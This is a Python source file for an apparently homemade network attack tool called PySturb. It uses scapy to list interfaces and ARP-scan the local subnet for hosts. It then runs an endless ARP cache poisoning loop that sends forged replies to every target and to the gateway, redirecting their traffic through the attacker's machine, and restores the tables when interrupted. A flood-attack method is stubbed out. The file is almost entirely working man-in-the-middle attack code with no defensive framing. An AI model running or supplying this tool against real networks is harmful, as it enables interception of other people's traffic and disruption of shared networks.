# import psutil
import json
import inquirer
import socket
import netifaces
import scapy.all as scapy
import time
import signal

# Print prettified json
def jprint(args):
    print(json.dumps(args, indent=4, sort_keys=True))

# Print pretiffied instance attributes
def pprint(args):
    jprint(vars(args))

class Address:
    def __init__(self, ip, mac):
        self.ip = ip
        self.mac = mac

class PySturb:
    def __init__(self):
        self.iface_list = self.get_iface_list()
        self.iface = None
        self.addr = None
        self.gateway = None
        self.targets = None

    # Display interface selection menu
    def prompt_select_iface(self):
        if not self.iface_list:
            print("No available network interface found!")
            return

        questions = [
            inquirer.List(
                "iface",
                message="Select network interface",
                choices=self.iface_list
            )
        ]
        iface = inquirer.prompt(questions)['iface']
        
        # Assign interface to global variable
        self.iface = iface
        
        # Get interface's addresses
        addrs = netifaces.ifaddresses(iface)

        # The interface seems not connected to any network, aborting...
        if not netifaces.AF_INET in addrs and not netifaces.AF_INET6 in addrs:
            return

        # Assign addresses to global variable
        ip = addrs[netifaces.AF_INET][0].get('addr')
        mac = addrs[netifaces.AF_LINK][0].get('addr')
        self.addr = Address(ip, mac)

        netmask = addrs[netifaces.AF_INET][0].get('netmask')
        self.cidr = sum(bin(int(x)).count('1') for x in netmask.split('.'))

        gateways = netifaces.gateways()[netifaces.AF_INET]
        gw_ip = [x[0] for x in gateways if x[1] == iface][0]
        gw_mac = scapy.getmacbyip(gw_ip)
        self.gateway = Address(gw_ip, gw_mac)

        # Scan targets
        self.targets = self.scan_targets()

    # Get available interfaces
    def get_iface_list(self):
        return [i for i in netifaces.interfaces() if i != 'lo']

    def flood_attack(self):
        pass

    def scan_targets(self):
        print(' [*] Scanning network...  (Press CTRL+C to stop)\n')
        ips=self.addr.ip + '/' + str(self.cidr)
        ret = []
        global interrupt_loop
        global original_sigint
        interrupt_loop = False
        original_sigint = signal.getsignal(signal.SIGINT)
        def handler(sig, frame):
            global interrupt_loop
            global original_sigint
            interrupt_loop = True
            signal.signal(signal.SIGINT, original_sigint)
        signal.signal(signal.SIGINT, handler)
        while not interrupt_loop:
            request = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(pdst=ips)
            ans, unans = scapy.srp(request, iface=self.iface, timeout=1, verbose=0)
            for send, recv in ans:
                if recv:
                    ip = recv[scapy.ARP].psrc
                    mac = recv[scapy.ARP].hwsrc
                    if ip != self.gateway.ip and not any(x.ip == ip for x in ret):
                        ret.append(Address(ip, mac))
                        print('     [{}] MAC: {}   IP: {}'.format(len(ret), mac, ip))
            time.sleep(0.5)
        return ret

    # Send forged arp response
    def arp_spoof(self, target, host, verbose=True):
        # Forging arp response frame
        arp_response = scapy.ARP(pdst=target.ip, hwdst=target.mac, psrc=host.ip, hwsrc=host.mac, op='is-at')
        # Send the forged frame
        scapy.send(arp_response, verbose=0)
        # Print message
        if verbose:
            print(" [+] Packet sent to {} \t : {} is-at {}".format(target.ip, host.ip, host.mac))

    # Begin arp cache poisoning
    def begin_arp_cache_poisoning(self, verbose=True):
        # Loop with 1 second delay
        while True:
            # Iterating targets
            for target in self.targets:
                # Spoofing target mac address with our own address
                spoofed_target = Address(target.ip, self.addr.mac)
                spoofed_gateway = Address(self.gateway.ip, self.addr.mac)
                # Performing arp spoofing
                self.arp_spoof(target, spoofed_gateway, verbose)
                self.arp_spoof(self.gateway, spoofed_target, verbose)
            time.sleep(1)
            

    # Send legitimate arp response to restore the network
    def restore(self, verbose=True):
            for target in self.targets:
                self.arp_spoof(target, self.gateway, verbose)
                self.arp_spoof(self.gateway, target, verbose)

worker = PySturb()
worker.prompt_select_iface()

try:
    print('\n [*] Begin ARP cache poisoning...\n')
    worker.begin_arp_cache_poisoning()
except KeyboardInterrupt:
    print('\n [*] Restoring network...\n')
    worker.restore()

# pprint(worker)
